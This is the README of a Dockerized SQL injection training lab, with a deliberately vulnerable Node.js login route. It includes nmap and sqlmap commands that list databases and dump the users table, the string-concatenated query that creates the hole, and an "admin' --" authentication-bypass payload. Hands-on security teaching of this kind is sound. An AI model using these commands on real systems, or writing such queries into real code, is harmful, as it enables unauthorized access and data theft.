# Dockerized Pentesting Lab - SQL Injection (SQLi)

This lab contains a vulnerable Node.js application and a PostgreSQL database designed for demonstrating SQL Injection vulnerabilities.

## Setup

1.  **Ensure Docker and Docker Compose are installed.**
2.  **Start the lab:**
    ```bash
    docker-compose up --build
    ```
3.  **Access the application:** Open `http://localhost:3000` in your browser.

## Pentesting Instructions

### 1. Find your Local IP Address
To target the container from another machine or tool (like a Kali VM), you need the host's IP.

- **On macOS/Linux:**
  ```bash
  ifconfig | grep "inet " | grep -v 127.0.0.1
  ```
- **On Windows:**
  ```cmd
  ipconfig
  ```

### 2. Network Scanning with nmap
Scan for the open port (3000) to confirm the service is running.
```bash
nmap -p 3000 <HOST_IP>
```

### 3. Exploiting SQL Injection with sqlmap
The `/login` route is vulnerable. We can use `sqlmap` to automate the extraction of the database.

**Step A: Capture the request data**
The login form sends a POST request to `/login` with JSON data: `{"username": "test", "password": "test"}`.

**Step B: Run sqlmap**
Run the following command to detect vulnerabilities and list databases:
```bash
sqlmap -u "http://<HOST_IP>:3000/login" --data '{"username": "admin", "password": "password"}' --method POST --batch --dbs
```

**Step C: Dump the `users` table**
Once you confirm the database name is `pentest_db`, dump the contents of the `users` table:
```bash
sqlmap -u "http://<HOST_IP>:3000/login" --data '{"username": "admin", "password": "password"}' --method POST --batch -D pentest_db -T users --dump
```

## How it works (The Vulnerability)
Inside `app/server.js`, the query is constructed using string concatenation:
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```
This allows an attacker to bypass authentication by entering something like:
- **Username:** `admin' --`
- **Password:** (anything)

The resulting SQL becomes:
`SELECT * FROM users WHERE username = 'admin' --' AND password = '...'`
The `--` comments out the rest of the query, logging in as admin without a password.
